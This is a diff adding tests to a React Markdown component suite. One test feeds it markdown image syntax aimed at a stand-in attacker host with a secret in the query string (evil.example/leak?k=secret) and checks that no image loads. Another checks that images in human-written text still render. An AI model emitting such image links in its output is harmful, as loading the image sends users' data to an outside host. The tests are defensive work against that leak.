@@ -185,6 +185,23 @@ describe("Markdown brief prose", () => {
     expect(screen.queryByRole("img")).toBeNull();
     expect(screen.getByText(/<img alt="Image"/)).toBeTruthy();
   });
+
+  it("loads no image from markdown image syntax", () => {
+    render(
+      <Markdown content={"Done ![x](https://evil.example/leak?k=secret)"} />,
+    );
+
+    expect(screen.queryByRole("img")).toBeNull();
+    expect(screen.getByText(/Done/)).toBeTruthy();
+  });
+
+  it("keeps markdown images in text people wrote", () => {
+    render(
+      <Markdown content={"![shot](https://example.com/a.png)"} renderHtml />,
+    );
+
+    expect(screen.getByRole("img", { name: "shot" })).toBeTruthy();
+  });
 });
 
 describe("Markdown mentions", () => {
